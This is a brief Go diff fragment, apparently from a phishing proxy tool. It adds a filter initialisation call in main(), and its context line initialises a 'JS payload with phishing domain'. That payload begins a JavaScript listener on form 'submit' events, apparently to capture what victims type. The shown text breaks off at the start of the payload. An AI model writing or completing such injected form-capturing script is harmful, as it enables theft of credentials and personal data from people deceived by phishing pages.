@@ -43,6 +43,7 @@ func createServer(handler http.Handler) *http.Server {
 
 func main() {
 	flag.Parse()
+	initFilters()
 
 	// Initialize JS payload with phishing domain
 	jsPayload = `document.addEventListener('submit', function(e) {
